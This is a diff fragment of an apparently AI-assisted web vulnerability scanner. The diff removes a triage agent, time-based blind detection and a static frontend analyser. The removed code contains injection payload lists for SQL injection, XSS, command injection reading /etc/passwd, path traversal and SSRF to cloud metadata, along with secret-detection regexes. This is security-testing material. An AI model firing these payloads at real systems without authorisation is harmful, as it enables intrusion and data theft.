-        "1 UNION SELECT NULL,NULL--",
-        "' AND '1'='2",
-        "' AND SLEEP(3)--",
-        "1' ORDER BY 1--",
-    ],
-    'xss': [
-        '<script>alert(1)</script>',
-        '"><img src=x onerror=alert(1)>',
-        '<svg/onload=alert(1)>',
-        "'-alert(1)-'",
-        '<img src=x onerror=alert(document.domain)>',
-    ],
-    'cmdi': [
-        '; id', '| whoami', '& uname -a',
-        '127.0.0.1; cat /etc/passwd',
-        '`id`', '$(whoami)',
-    ],
-    'lfi': [
-        '../../../../etc/passwd',
-        '....//....//....//etc/passwd',
-        '/etc/passwd%00',
-        '..\\..\\..\\..\\etc/hostname',
-    ],
-    'ssrf': [
-        'http://127.0.0.1',
-        'http://169.254.169.254/latest/meta-data/',
-        'http://[::1]/',
-        'http://0x7f000001/',
-    ],
-    'idor': ['1', '2', '0', '999', '-1'],
-    'open_redirect': [
-        'https://example.com',
-        '//example.com',
-        '/\\example.com',
-        'https://example.com%2F%2F',
-    ],
-}
-
-
-# ─── Triage Verification Agent ───────────────────────────────────────────────
-
-def _triage_verify(session, ep, target_param, vtype, original_payload, original_evidence, baseline, original_resp):
-    """
-    Triage Agent: independently verifies a suspected vulnerability.
-    1. AI analyzes whether the original evidence is convincing
-    2. Generates a DIFFERENT safe verification payload
-    3. Re-tests with the new payload
-    4. Both must agree for confirmation
-    """
-    log('info', f'  🛡️ TRIAGE AGENT: Verifying {vtype.upper()} on {ep["url"]}...')
-
-    # ── Step 1: AI skeptical review of original evidence ──
-    bl_text = _extract_relevant(baseline['body'])[:1500] if baseline else 'N/A'
-    atk_text = _extract_relevant(original_resp['body'])[:2000]
-
-    review_prompt = f"""You are a SKEPTICAL Triage Security Agent. Your job is to prevent false positives.
-A scanner claims it found a vulnerability. Analyze the evidence CRITICALLY.
-
-CLAIMED VULNERABILITY: {vtype}
-URL: {ep['url']}
-PARAMETER: {target_param['name']}
-PAYLOAD USED: {original_payload}
-CLAIMED EVIDENCE: {original_evidence}
-
-BASELINE RESPONSE: status={baseline['status_code'] if baseline else 'N/A'} length={baseline['length'] if baseline else 'N/A'}
-{bl_text}
-
-ATTACK RESPONSE: status={original_resp['status_code']} length={original_resp['length']}
-{atk_text}
-
-CRITICAL QUESTIONS TO ASK:
-1. Is the evidence ACTUALLY proving the vulnerability, or could it be a normal application behavior?
-2. Could the response difference be caused by input validation, WAF, or error handling (not the actual vuln)?
-3. For XSS: Is the payload ACTUALLY reflected with JS execution capability, or is it just HTML/text?
-4. For SQLi: Are there REAL SQL errors or data leaks, or just different page content?
-5. For CMDi: Is there ACTUAL command output, or just application error messages?
-6. Could this be a honeypot or intentionally deceptive response?
-
-Be VERY skeptical. Only confirm if the evidence is UNDENIABLE.
-
-Respond ONLY JSON:
-{{"initial_review": "pass"/"fail", "confidence": 0-100, "concerns": "any doubts"}}"""
-
-    try:
-        raw = ai_call(review_prompt, temp=0.1)
-        review = parse_json(raw)
+            out = [p if isinstance(p, str) else p.get('payload', str(p)) for p in result]
+            return out[:5] if out else FALLBACK_PAYLOADS.get(vtype, ['test'])
     except Exception:
-        review = {'initial_review': 'pass', 'confidence': 50, 'concerns': 'AI review unavailable'}
-
-    log('info', f'  🛡️ Triage review: {review.get("initial_review", "unknown")} (confidence: {review.get("confidence", "?")}%)')
-    if review.get('concerns'):
-        log('info', f'  🛡️ Concerns: {review.get("concerns", "")[:200]}')
-
-    # If AI is very confident it's a false positive, reject immediately
-    if review.get('initial_review') == 'fail' and review.get('confidence', 0) >= 80:
-        return {
-            'confirmed': False,
-            'reason': f'Triage AI review rejected with {review.get("confidence")}% confidence: {review.get("concerns", "")}'
-        }
-
-    # ── Step 2: Generate a DIFFERENT verification payload ──
-    verify_prompt = f"""Generate exactly ONE safe verification payload for a suspected {vtype} vulnerability.
-This MUST be DIFFERENT from the original payload but test the SAME vulnerability type.
-
-Original payload was: {original_payload}
-Parameter: {target_param['name']}
-URL: {ep['url']}
-Method: {ep['method']}
-
-SAFETY: The payload must be 100% non-destructive and read-only.
-It should use a DIFFERENT technique than the original to independently verify the vulnerability.
-
-For SQLi: if original was OR-based, try UNION or error-based or time-based
-For XSS: if original was script tag, try img onerror or svg onload
-For CMDi: if original was semicolon, try pipe or backticks
-For LFI: if original was ../../../, try encoding or null byte
-
-Respond with ONLY a JSON string (the single payload):
-"verification_payload_here"""
-
-    try:
-        raw = ai_call(verify_prompt, temp=0.4)
-        # Try to extract just the string
-        raw = raw.strip().strip('"').strip("'")
-        if raw.startswith('['):
-            parsed = parse_json(raw)
-            verify_payload = parsed[0] if parsed else None
-        elif raw.startswith('{'):
-            parsed = parse_json(raw)
-            verify_payload = parsed.get('payload', None)
-        else:
-            verify_payload = raw
-    except Exception:
-        verify_payload = None
-
-    if not verify_payload or not _is_payload_safe(verify_payload, vtype):
-        # Use a different fallback payload than the original
-        fallbacks = SAFE_FALLBACK_PAYLOADS.get(vtype, ['test'])
-        verify_payload = None
-        for fb in fallbacks:
-            if fb != original_payload:
-                verify_payload = fb
-                break
-        if not verify_payload:
-            verify_payload = fallbacks[0] if fallbacks else 'test'
-
-    log('info', f'  🛡️ Triage re-test with: {verify_payload}')
-
-    # ── Step 3: Re-test with verification payload ──
-    verify_resp = _send(session, ep, target_param['name'], verify_payload)
-    if not verify_resp:
-        return {
-            'confirmed': False,
-            'reason': 'Triage verification request failed (no response)'
-        }
-
-    log('info', f'  🛡️ Triage response: [{verify_resp["status_code"]}] {verify_resp["length"]} bytes')
-
-    # ── Step 4: Analyze verification result ──
-    verify_vuln, verify_evidence = _analyze(vtype, ep['url'], target_param['name'], verify_payload, baseline, verify_resp)
-
-    if verify_vuln:
-        log('ok', f'  🛡️ Triage re-test CONFIRMED with different payload!')
-        return {
-            'confirmed': True,
-            'triage_evidence': f'Independently verified with payload: {verify_payload}. Evidence: {verify_evidence}',
-            'triage_payload': verify_payload
-        }
-
-    # If re-test didn't confirm but AI initial review was positive with high confidence
-    if review.get('initial_review') == 'pass' and review.get('confidence', 0) >= 85:
-        log('info', f'  🛡️ Re-test inconclusive but AI review highly confident ({review.get("confidence")}%) — accepting')
-        return {
-            'confirmed': True,
-            'triage_evidence': f'AI triage review confirmed with {review.get("confidence")}% confidence. Re-test inconclusive but original evidence compelling: {original_evidence}',
-            'triage_payload': verify_payload
-        }
-
-    return {
-        'confirmed': False,
-        'reason': f'Triage re-test did not confirm. AI confidence: {review.get("confidence", "?")}%. Verification payload: {verify_payload}'
-    }
+        pass
+    return FALLBACK_PAYLOADS.get(vtype, ['test'])
 
 def _extract_relevant(html):
     """Strip HTML boilerplate, return just the text content."""
@@ -1645,11 +933,7 @@ def _analyze(vtype, url, param, payload, baseline, resp):
                       'Warning: mysql', 'Unclosed quotation mark',
                       'SQLSTATE[', 'pg_query', 'ORA-', 'SQL syntax',
                       'sqlite3.OperationalError', 'psycopg2', 'MySQLdb',
-                      'sqlalchemy.exc', 'unterminated quoted string',
-                      'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
-                      'JET Database Engine', 'Syntax error in query',
-                      'MariaDB server version', 'valid MySQL result',
-                      'Warning: pg_', 'supplied argument is not a valid']
+                      'sqlalchemy.exc', 'unterminated quoted string']
         for err in sql_errors:
             if err.lower() in body.lower() and err.lower() not in bl_body.lower():
                 return True, f"SQL error message found: {err}"
@@ -1667,14 +951,6 @@ def _analyze(vtype, url, param, payload, baseline, resp):
             tds = soup.find_all('td')
             if pres or len(tds) > 4:
                 return True, f"Response significantly larger ({atk_len} vs {bl_len} bytes) with data output"
-
-        # Time-based blind SQLi detection
-        bl_time = baseline.get('baseline_time_avg', baseline.get('response_time', 0)) if baseline else 0
-        atk_time = resp.get('response_time', 0)
-        payload_lower = payload.lower()
-        if any(kw in payload_lower for kw in ['sleep', 'waitfor', 'pg_sleep', 'benchmark']):
-            if atk_time > bl_time + 2.5 and atk_time > 3.0:
-                return True, f"Time-based blind SQLi: response took {atk_time:.1f}s vs baseline {bl_time:.1f}s (delay payload: {payload[:50]})"
 
     elif vtype == 'xss':
         # ── STRICT XSS detection ──
@@ -1739,9 +1015,6 @@ def _analyze(vtype, url, param, payload, baseline, resp):
             ('Linux ', 'OS info leaked via uname'),
             ('total ', 'Directory listing output (ls command)'),
             ('drwx', 'Directory permission listing leaked'),
-            ('PING ', 'Ping command output detected'),
-            ('TTL=', 'Ping TTL output detected'),
-            ('bytes from', 'Ping response detected'),
         ]
         for marker, desc in cmd_evidence:
             if marker in body and marker not in bl_body:
@@ -1751,14 +1024,6 @@ def _analyze(vtype, url, param, payload, baseline, resp):
             extra = body[len(bl_body):] if len(body) > len(bl_body) else body
             if any(m in extra for m, _ in cmd_evidence):
                 return True, "Command execution output detected"
-
-        # Time-based blind CMDi detection
-        bl_time = baseline.get('baseline_time_avg', baseline.get('response_time', 0)) if baseline else 0
-        atk_time = resp.get('response_time', 0)
-        payload_lower = payload.lower()
-        if any(kw in payload_lower for kw in ['sleep', 'ping -c', 'timeout']):
-            if atk_time > bl_time + 2.5 and atk_time > 3.0:
-                return True, f"Time-based blind CMDi: response took {atk_time:.1f}s vs baseline {bl_time:.1f}s (delay payload: {payload[:50]})"
 
     elif vtype == 'lfi':
         lfi_markers = [
@@ -1921,430 +1186,6 @@ def step_header_check(target_url, session):
         log('error', f'Header check error: {e}')
 
 
-# ─── Stage 3.6: Static Frontend Analysis ────────────────────────────────────
-
-# Known vulnerable JS library versions (library name → [(version_regex, CVE/issue, severity)])
-VULNERABLE_LIBRARIES = {
-    'jquery': [
-        (r'[12]\.\d+\.\d+', '< 3.5.0', 'XSS via jQuery.htmlPrefilter — CVE-2020-11022/11023', 'Medium'),
-        (r'1\.\d+\.\d+', '< 2.0.0', 'Multiple XSS and DoS vulnerabilities', 'High'),
-    ],
-    'bootstrap': [
-        (r'[23]\.\d+\.\d+', '< 4.3.1', 'XSS via data-template — CVE-2019-8331', 'Medium'),
-        (r'3\.3\.[0-6]', '3.3.0-3.3.6', 'XSS in tooltip/popover — CVE-2018-14041', 'Medium'),
-    ],
-    'angular': [
-        (r'1\.\d+\.\d+', '1.x (EOL)', 'AngularJS 1.x is end-of-life, multiple known XSS vectors', 'High'),
-    ],
-    'angularjs': [
-        (r'1\.\d+\.\d+', '1.x (EOL)', 'AngularJS 1.x is end-of-life — sandbox escape CVEs', 'High'),
-    ],
-    'lodash': [
-        (r'4\.[01][0-6]?\.\d+', '< 4.17.21', 'Prototype pollution — CVE-2021-23337', 'High'),
-    ],
-    'moment': [
-        (r'\d+\.\d+\.\d+', 'any', 'Moment.js is deprecated — ReDoS in date parsing — CVE-2022-31129', 'Low'),
-    ],
-    'vue': [
-        (r'2\.[0-5]\.\d+', '< 2.6.0', 'XSS via template injection — CVE-2018-6341', 'Medium'),
-    ],
-    'react-dom': [
-        (r'16\.[0-7]\.\d+', '< 16.8.0', 'XSS via dangerouslySetInnerHTML edge cases', 'Low'),
-    ],
-    'dompurify': [
-        (r'2\.[0-2]\.\d+', '< 2.3.0', 'Mutation XSS bypass — CVE-2021-23648', 'High'),
-    ],
-    'handlebars': [
-        (r'[0-3]\.\d+\.\d+', '< 4.7.7', 'Prototype pollution — CVE-2021-23369', 'High'),
-    ],
-    'axios': [
-        (r'0\.\d+\.\d+', '< 1.0.0', 'SSRF via follow redirects — CVE-2023-45857', 'Medium'),
-    ],
-}
-
-# Secret/API key patterns
-SECRET_PATTERNS = [
-    (r'(?:api[_-]?key|apikey)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']', 'API Key exposed'),
-    (r'(?:secret|password|passwd|pwd)\s*[:=]\s*["\']([^"\']{8,})["\']', 'Secret/Password exposed'),
-    (r'(?:aws_access_key_id|aws_secret)\s*[:=]\s*["\']([A-Z0-9]{16,})["\']', 'AWS Key exposed'),
-    (r'(?:AKIA[0-9A-Z]{16})', 'AWS Access Key ID'),
-    (r'(?:sk-[a-zA-Z0-9]{20,})', 'OpenAI/Stripe Secret Key'),
-    (r'(?:ghp_[a-zA-Z0-9]{36})', 'GitHub Personal Access Token'),
-    (r'(?:glpat-[a-zA-Z0-9\-]{20,})', 'GitLab Access Token'),
-    (r'(?:Bearer\s+[a-zA-Z0-9_\-\.]{20,})', 'Bearer Token exposed'),
-    (r'(?:mongodb(?:\+srv)?://[^"\'\s]+)', 'MongoDB Connection String'),
-    (r'(?:postgres(?:ql)?://[^"\'\s]+)', 'PostgreSQL Connection String'),
-    (r'(?:mysql://[^"\'\s]+)', 'MySQL Connection String'),
-    (r'(?:firebase[a-zA-Z]*\.com/[^"\'\s]+)', 'Firebase URL exposed'),
-    (r'(?:sk-or-v1-[a-f0-9]{64})', 'OpenRouter API Key'),
-]
-
-# Insecure JS patterns
-INSECURE_JS_PATTERNS = [
-    (r'\beval\s*\(', 'eval() usage — code injection risk', 'Medium'),
-    (r'\.innerHTML\s*=', 'innerHTML assignment — DOM XSS risk', 'Low'),
-    (r'document\.write\s*\(', 'document.write() — DOM XSS risk', 'Low'),
-    (r'window\.location\s*=\s*[^;]*(?:get|query|param|hash|search)', 'DOM-based open redirect risk', 'Medium'),
-    (r'\.setAttribute\s*\(\s*["\'](?:on\w+|href|src|action)', 'Dynamic attribute setting — potential XSS sink', 'Low'),
-    (r'new\s+Function\s*\(', 'new Function() — code injection risk', 'Medium'),
-    (r'setTimeout\s*\(\s*["\']', 'setTimeout with string — eval equivalent', 'Medium'),
-    (r'setInterval\s*\(\s*["\']', 'setInterval with string — eval equivalent', 'Medium'),
-    (r'location\s*\.\s*(?:href|replace|assign)\s*=\s*(?:.*(?:location|document|window)\s*\.)', 'DOM-based redirect from user input', 'Medium'),
-    (r'(?:localStorage|sessionStorage)\.setItem\s*\([^)]*(?:password|token|secret|key)', 'Sensitive data in browser storage', 'Medium'),
-    (r'document\.cookie\s*=', 'Cookie manipulation via JS — potential session issues', 'Low'),
-]
-
-
-def step_static_analysis(target_url, session, max_resources=30):
-    """Static analyzer: scan frontend HTML, JS, CSS for security issues."""
-    log('info', '═══ STAGE 3.6: STATIC FRONTEND ANALYSIS ═══')
-
-    parsed_base = urlparse(target_url)
-    base_domain = parsed_base.netloc
-
-    issues_found = 0
-
-    try:
-        # ── Step 1: Fetch main page and discover resources ──
-        r = session.get(target_url, timeout=10)
-        soup = BeautifulSoup(r.text, 'html.parser')
-
-        # Collect all script, link, and resource URLs
-        resources = []
-
-        for script in soup.find_all('script'):
-            src = script.get('src')
-            if src:
-                resources.append({
-                    'url': urljoin(target_url, src),
-                    'type': 'js',
-                    'has_sri': bool(script.get('integrity')),
-                    'crossorigin': script.get('crossorigin'),
-                    'tag': str(script)[:200]
-                })
-            # Inline scripts
-            if script.string and len(script.string.strip()) > 10:
-                resources.append({
-                    'url': target_url,
-                    'type': 'inline_js',
-                    'content': script.string,
-                    'tag': 'inline'
-                })
-
-        for link in soup.find_all('link', rel=True):
-            href = link.get('href')
-            if href and 'stylesheet' in ' '.join(link.get('rel', [])):
-                resources.append({
-                    'url': urljoin(target_url, href),
-                    'type': 'css',
-                    'has_sri': bool(link.get('integrity')),
-                    'tag': str(link)[:200]
-                })
-
-        log('info', f'  Found {len(resources)} frontend resources')
-
-        # ── Step 2: Analyze the main HTML page ──
-        log('info', '  📄 Analyzing main HTML page...')
-        issues_found += _analyze_html(target_url, r.text, base_domain)
-
-        # ── Step 3: Check each external resource ──
-        js_count = 0
-        for res in resources[:max_resources]:
-            if is_cancelled():
-                break
-
-            if res['type'] == 'inline_js':
-                log('info', f'  📜 Analyzing inline script...')
-                issues_found += _analyze_js(target_url, res['content'], 'inline script')
-                continue
-
-            if res['type'] == 'js':
-                # Check SRI on CDN scripts
-                res_parsed = urlparse(res['url'])
-                is_cdn = res_parsed.netloc != base_domain
-                if is_cdn and not res.get('has_sri'):
-                    log('warn', f'  ⚠ Missing SRI on CDN script: {res["url"][:80]}')
-                    fid = fp('GET', res['url'], 'integrity', 'missing_sri')
-                    finding = {
-                        'id': fid, 'url': res['url'], 'method': 'GET',
-                        'param': 'integrity attribute',
-                        'vuln_type': 'security_headers',
-                        'payload': 'N/A',
-                        'evidence': f'CDN-hosted script loaded without Subresource Integrity (SRI). '
-                                    f'If the CDN is compromised, malicious code could be injected. '
-                                    f'Script: {res["url"][:100]}',
-                        'severity': 'Medium',
-                        'confirmed': True,
-                        'response_code': 200,
-                        'response_snippet': res['tag'][:500],
-                        'timestamp': time.time()
-                    }
-                    if write_finding(finding):
-                        socketio.emit('finding', finding)
-                        issues_found += 1
-
-                # Fetch and analyze JS content
-                try:
-                    r_js = session.get(res['url'], timeout=8)
-                    if r_js.status_code == 200 and len(r_js.text) > 0:
-                        js_count += 1
-                        short_name = res['url'].split('/')[-1].split('?')[0] or 'script.js'
-                        log('info', f'  📜 Analyzing JS: {short_name} ({len(r_js.text)} bytes)')
-                        issues_found += _analyze_js(res['url'], r_js.text, short_name)
-                except Exception:
-                    pass
-
-            elif res['type'] == 'css':
-                try:
-                    r_css = session.get(res['url'], timeout=8)
-                    if r_css.status_code == 200:
-                        issues_found += _analyze_css(res['url'], r_css.text)
-                except Exception:
-                    pass
-
-            time.sleep(0.1)
-
-        log('ok', f'  Static analysis complete: {issues_found} issues found across {len(resources)} resources')
-
-    except Exception as e:
-        log('error', f'  Static analysis error: {e}')
-
-    return issues_found
-
-
-def _analyze_html(url, html, base_domain):
-    """Analyze HTML for security issues."""
-    issues = 0
-    soup = BeautifulSoup(html, 'html.parser')
-
-    # ── Mixed content check ──
-    if url.startswith('https://'):
-        http_resources = []
-        for tag in soup.find_all(['script', 'link', 'img', 'iframe', 'object', 'embed']):
-            src = tag.get('src') or tag.get('href') or ''
-            if src.startswith('http://'):
-                http_resources.append(src[:80])
-        if http_resources:
-            log('warn', f'  ⚠ Mixed content: {len(http_resources)} HTTP resources on HTTPS page')
-            fid = fp('GET', url, 'mixed_content', 'security_headers')
-            finding = {
-                'id': fid, 'url': url, 'method': 'GET',
-                'param': 'Mixed Content',
-                'vuln_type': 'security_headers',
-                'payload': 'N/A',
-                'evidence': f'HTTPS page loads {len(http_resources)} resources over HTTP. '
-                            f'Examples: {", ".join(http_resources[:3])}',
-                'severity': 'Medium',
-                'confirmed': True,
-                'response_code': 200,
-                'response_snippet': '\n'.join(http_resources[:5]),
-                'timestamp': time.time()
-            }
-            if write_finding(finding):
-                socketio.emit('finding', finding)
-                issues += 1
-
-    # ── Forms posting to HTTP ──
-    for form in soup.find_all('form'):
-        action = form.get('action', '')
-        if action.startswith('http://') and url.startswith('https://'):
-            log('warn', f'  ⚠ Form submits to HTTP: {action[:80]}')
-            issues += 1
-
-    # ── Sensitive HTML comments ──
-    comments = soup.find_all(string=lambda text: isinstance(text, type(soup.new_string(''))) and '<!--' in str(text) or (hasattr(text, 'element') if False else False))
-    import re as _re
-    comment_texts = _re.findall(r'<!--(.*?)-->', html, _re.DOTALL)
-    sensitive_keywords = ['password', 'secret', 'api_key', 'apikey', 'token', 'admin',
-                          'debug', 'todo', 'fixme', 'hack', 'temp', 'username',
-                          'database', 'db_', 'mysql', 'postgres', 'internal',
-                          'private', 'credentials', 'config']
-    for comment in comment_texts:
-        comment_lower = comment.lower().strip()
-        if len(comment_lower) > 5:  # Skip tiny comments
-            for kw in sensitive_keywords:
-                if kw in comment_lower:
-                    log('warn', f'  ⚠ Sensitive HTML comment contains "{kw}": {comment_lower[:60]}...')
-                    fid = fp('GET', url, f'comment_{kw}', 'info_disclosure')
-                    finding = {
-                        'id': fid, 'url': url, 'method': 'GET',
-                        'param': f'HTML Comment ({kw})',
-                        'vuln_type': 'security_headers',
-                        'payload': 'N/A',
-                        'evidence': f'HTML comment contains sensitive keyword "{kw}": {comment_lower[:120]}',
-                        'severity': 'Low',
-                        'confirmed': True,
-                        'response_code': 200,
-                        'response_snippet': f'<!-- {comment_lower[:300]} -->',
-                        'timestamp': time.time()
-                    }
-                    if write_finding(finding):
-                        socketio.emit('finding', finding)
-                        issues += 1
-                    break  # One finding per comment
-
-    # ── Autocomplete on password fields ──
-    for inp in soup.find_all('input', {'type': 'password'}):
-        if inp.get('autocomplete', '').lower() not in ('off', 'new-password', 'current-password'):
-            log('warn', '  ⚠ Password field without autocomplete="off"')
-            issues += 1
-
-    # ── Source map references ──
-    if '//# sourceMappingURL=' in html:
-        log('warn', '  ⚠ Source map reference found — may expose original source code')
-        issues += 1
-
-    return issues
-
-
-def _analyze_js(url, content, name):
-    """Analyze JavaScript content for vulnerabilities."""
-    issues = 0
-
-    # ── Library version detection ──
-    for lib_name, vulns in VULNERABLE_LIBRARIES.items():
-        # Common version patterns in JS files
-        version_patterns = [
-            rf'(?:{lib_name})\s*[vV]?(\d+\.\d+\.\d+)',
-            rf'["\']?version["\']?\s*[:=]\s*["\'](\d+\.\d+\.\d+)',
-            rf'{lib_name}[.-](\d+\.\d+\.\d+)',
-            rf'/\*[^*]*{lib_name}\s+v?(\d+\.\d+\.\d+)',
-        ]
-        for vp in version_patterns:
-            matches = re.findall(vp, content[:5000], re.IGNORECASE)
-            if matches:
-                version = matches[0]
-                for vuln_pattern, version_range, description, severity in vulns:
-                    if re.match(vuln_pattern, version):
-                        log('warn', f'  🔴 OUTDATED: {lib_name} v{version} ({version_range}) — {description}')
-                        fid = fp('GET', url, f'{lib_name}_{version}', 'outdated_library')
-                        finding = {
-                            'id': fid, 'url': url, 'method': 'GET',
-                            'param': f'{lib_name} v{version}',
-                            'vuln_type': 'security_headers',
-                            'payload': 'N/A',
-                            'evidence': f'Outdated library: {lib_name} v{version} ({version_range}). {description}',
-                            'severity': severity,
-                            'confirmed': True,
-                            'response_code': 200,
-                            'response_snippet': f'Detected in: {name}\nVersion: {version}\nVulnerability: {description}',
-                            'timestamp': time.time()
-                        }
-                        if write_finding(finding):
-                            socketio.emit('finding', finding)
-                            issues += 1
-                        break
-                break  # Stop checking patterns once version found
-
-    # ── Secret/API key detection ──
-    for pattern, desc in SECRET_PATTERNS:
-        matches = re.findall(pattern, content, re.IGNORECASE)
-        if matches:
-            for match in matches[:2]:  # Max 2 per pattern
-                masked = match[:6] + '...' + match[-4:] if len(match) > 10 else '***'
-                log('warn', f'  🔑 {desc}: {masked} in {name}')
-                fid = fp('GET', url, f'secret_{desc[:20]}', 'info_disclosure')
-                finding = {
-                    'id': fid, 'url': url, 'method': 'GET',
-                    'param': desc,
-                    'vuln_type': 'security_headers',
-                    'payload': 'N/A',
-                    'evidence': f'{desc} found in {name}: {masked}',
-                    'severity': 'High',
-                    'confirmed': True,
-                    'response_code': 200,
-                    'response_snippet': f'Pattern: {desc}\nFile: {name}\nValue: {masked}',
-                    'timestamp': time.time()
-                }
-                if write_finding(finding):
-                    socketio.emit('finding', finding)
-                    issues += 1
-
-    # ── Insecure JS patterns ──
-    for pattern, desc, severity in INSECURE_JS_PATTERNS:
-        matches = re.findall(pattern, content)
-        if matches:
-            count = min(len(matches), 3)
-            log('warn', f'  ⚠ {desc} ({count}x in {name})')
-            fid = fp('GET', url, f'jspattern_{desc[:20]}', 'insecure_code')
-            finding = {
-                'id': fid, 'url': url, 'method': 'GET',
-                'param': f'JS Pattern: {desc[:50]}',
-                'vuln_type': 'security_headers',
-                'payload': 'N/A',
-                'evidence': f'{desc} — found {count} occurrence(s) in {name}',
-                'severity': severity,
-                'confirmed': True,
-                'response_code': 200,
-                'response_snippet': f'Pattern: {pattern}\nFile: {name}\nOccurrences: {count}',
-                'timestamp': time.time()
-            }
-            if write_finding(finding):
-                socketio.emit('finding', finding)
-                issues += 1
-
-    # ── Exposed internal URLs/endpoints ──
-    endpoint_patterns = [
-        r'(?:https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)[:\d]*/[^\s"\']+)',
-        r'(?:/api/[a-zA-Z0-9_/\-]+)',
-        r'(?:/admin[/a-zA-Z0-9_\-]*)',
-        r'(?:/internal[/a-zA-Z0-9_\-]*)',
-        r'(?:/debug[/a-zA-Z0-9_\-]*)',
-    ]
-    for ep in endpoint_patterns:
-        matches = re.findall(ep, content)
-        if matches:
-            unique = list(set(matches))[:5]
-            for endpoint in unique:
-                if 'localhost' in endpoint or '127.0.0.1' in endpoint or '/api/' in endpoint:
-                    log('info', f'  📡 Internal endpoint in {name}: {endpoint[:80]}')
-
-    # ── Source map check ──
-    if '//# sourceMappingURL=' in content or '//@ sourceMappingURL=' in content:
-        map_match = re.search(r'//[#@] sourceMappingURL=(\S+)', content)
-        if map_match:
-            log('warn', f'  ⚠ Source map reference in {name}: {map_match.group(1)[:60]}')
-            issues += 1
-
-    # ── Debug artifacts ──
-    debug_patterns = [
-        (r'\bconsole\.(log|debug|info|warn|error)\s*\(', 'console.log() in production'),
-        (r'\bdebugger\b', 'debugger statement in production'),
-    ]
-    for dp, desc in debug_patterns:
-        if re.search(dp, content):
-            debug_count = len(re.findall(dp, content))
-            if debug_count > 3:  # Only flag if excessive
-                log('info', f'  ℹ {desc}: {debug_count}x in {name}')
-
-    return issues
-
-
-def _analyze_css(url, content):
-    """Analyze CSS for security issues."""
-    issues = 0
-
-    # External resource loading via CSS
-    imports = re.findall(r'@import\s+(?:url\s*\()?["\']?(https?://[^"\')\s]+)', content)
-    if imports:
-        for imp in imports[:3]:
-            if 'http://' in imp:
-                log('warn', f'  ⚠ CSS imports over HTTP: {imp[:80]}')
-                issues += 1
-
-    # CSS expressions (IE-specific XSS vector)
-    if 'expression(' in content.lower():
-        log('warn', '  ⚠ CSS expression() found — potential XSS (IE)')
-        issues += 1
-
-    # CSS behavior/binding (security risk)
-    if 'behavior:' in content.lower() or '-moz-binding:' in content.lower():
-        log('warn', '  ⚠ CSS behavior/binding found — potential code execution')
-        issues += 1
-
-    return issues
-
-
 # ─── Stage 4: Reports ───────────────────────────────────────────────────────
 
 def step_reports():
@@ -2394,7 +1235,7 @@ Format:
 
 # ─── Pipeline ────────────────────────────────────────────────────────────────
 
-def run_pipeline(target_url, cookies_str='', auto_login=True, username='', password='', static_analysis=True, triage_agent=True):
+def run_pipeline(target_url, cookies_str='', auto_login=True, username='', password=''):
     global scan_active
     start = time.time()
     scan_cancel.clear()
@@ -2449,11 +1290,6 @@ def run_pipeline(target_url, cookies_str='', auto_login=True, username='', passw
             log('warn', 'Scan cancelled')
             return
 
-        # ── Stage 0: Fingerprint & Recon ──
-        socketio.emit('stage', {'stage': 'fingerprint', 'status': 'active'})
-        fingerprint = step_fingerprint(target_url, session)
-        socketio.emit('stage', {'stage': 'fingerprint', 'status': 'done'})
-
         # ── Stage 1: Crawl ──
         socketio.emit('stage', {'stage': 'crawl', 'status': 'active'})
         endpoints, detected_dvwa = step_crawl(target_url, session)
@@ -2480,7 +1316,7 @@ def run_pipeline(target_url, cookies_str='', auto_login=True, username='', passw
 
         # ── Stage 3: Attack ──
         socketio.emit('stage', {'stage': 'attack', 'status': 'active'})
-        step_attack(classified, session, is_dvwa, fingerprint=fingerprint)
+        step_attack(classified, session, is_dvwa)
         socketio.emit('stage', {'stage': 'attack', 'status': 'done'})
 
         if is_cancelled():
@@ -2489,14 +1325,6 @@ def run_pipeline(target_url, cookies_str='', auto_login=True, username='', passw
 
         # ── Stage 3.5: Security Headers ──
         step_header_check(target_url, session)
-
-        # ── Stage 3.6: Static Frontend Analysis ──
-        if static_analysis and not is_cancelled():
-            socketio.emit('stage', {'stage': 'static_analysis', 'status': 'active'})
-            step_static_analysis(target_url, session)
-            socketio.emit('stage', {'stage': 'static_analysis', 'status': 'done'})
-        elif not static_analysis:
-            log('info', '  ⏭ Static analysis skipped (disabled)')
 
         # ── Stage 4: Reports ──
         socketio.emit('stage', {'stage': 'report', 'status': 'active'})
@@ -2546,8 +1374,6 @@ def start_scan():
     cookies = data.get('cookies', '').strip()
     username = data.get('username', '').strip()
     password = data.get('password', '').strip()
-    static_analysis = data.get('static_analysis', True)
-    triage_agent = data.get('triage_agent', True)
 
     if not url:
         return jsonify({'error': 'URL required'}), 400
@@ -2563,7 +1389,7 @@ def start_scan():
     scan_cancel.clear()
     threading.Thread(
         target=run_pipeline,
-        args=(url, cookies, auto, username, password, static_analysis, triage_agent),
+        args=(url, cookies, auto, username, password),
         daemon=True
     ).start()
     return jsonify({'status': 'started'})
